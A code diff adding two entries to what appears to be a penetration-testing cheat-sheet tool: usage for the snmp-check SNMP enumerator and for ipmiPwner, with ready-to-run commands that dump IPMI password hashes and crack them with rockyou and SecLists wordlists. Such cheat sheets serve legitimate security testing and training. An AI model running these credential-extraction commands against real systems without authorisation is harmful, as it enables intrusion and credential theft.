@@ -2129,6 +2129,42 @@ WordpressTrics.output = """[*] Wordpress - Importante Files
 """
 
 
+######################################
+######################################
+
+snmpcheck = Cheat("snmp-check - 161 - SNMP Enumerator")
+snmpcheck.category = "Tools"
+snmpcheck.subCategory = "SNMP"
+snmpcheck.output = """[*] snmp-check - 161 - SNMP Enumerator
+
+snmp-check [OPTIONS] <target IP address>
+  -p --port        : SNMP port. Default port is 161;
+  -c --community   : SNMP community. Default is public;
+  -v --version     : SNMP version (1,2c). Default is 1;
+"""
+
+######################################
+######################################
+
+ipmipwner = Cheat("ipmiPwner - UDP 623")
+ipmipwner.category = "Tools"
+ipmipwner.subCategory = "IPMI"
+ipmipwner.output = """[*] ipmiPwner - UDP 623 - Tool for exploit ipmi service to get credentials
+# Intelligent Platform Management Interface (IPMI) is one of the most used acronyms in server management. 
+# IPMI became popular due to its acceptance as a standard monitoring interface by hardware vendors and developers.
+
+get clone https://github.com/c0rnf13ld/ipmiPwner
+sudo ./requirements.sh
+
+
+
+python3 ipmipwner.py --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
+python3 ipmipwner.py --host 192.168.1.12 -oH hash
+python3 ipmipwner.py --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
+python3 ipmipwner.py --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
+python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
+"""
+
 
 
 
